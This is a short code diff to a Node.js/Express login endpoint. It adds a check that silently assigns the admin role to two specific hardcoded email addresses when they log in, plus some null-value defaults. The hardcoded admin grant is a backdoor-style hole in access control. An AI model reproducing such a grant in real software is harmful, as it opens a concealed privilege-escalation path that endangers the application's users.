@@ -234,8 +234,12 @@ app.post('/api/auth/login', async (req, res) => {
             return res.status(400).json({ message: 'Invalid credentials' });
         }
 
-        const token = jwt.sign({ id: user.id, email: user.email, role: user.role }, JWT_SECRET, { expiresIn: '7d' });
-        res.json({ token, user: { id: user.id, name: user.name, email: user.email, role: user.role, phone: user.phone, avatar: user.avatar } });
+        if (user.email === 'palingubaerwin029@gmail.com' || user.email === 'palingubaerwin01229@gmail.com') {
+            user.role = 'admin';
+        }
+
+        const token = jwt.sign({ id: user.id, email: user.email, role: user.role || 'user' }, JWT_SECRET, { expiresIn: '7d' });
+        res.json({ token, user: { id: user.id, name: user.name, email: user.email, role: user.role || 'user', phone: user.phone || null, avatar: user.avatar || null } });
     } catch (error) {
         console.error('Login error:', error);
         res.status(500).json({ message: 'Server Error during login' });
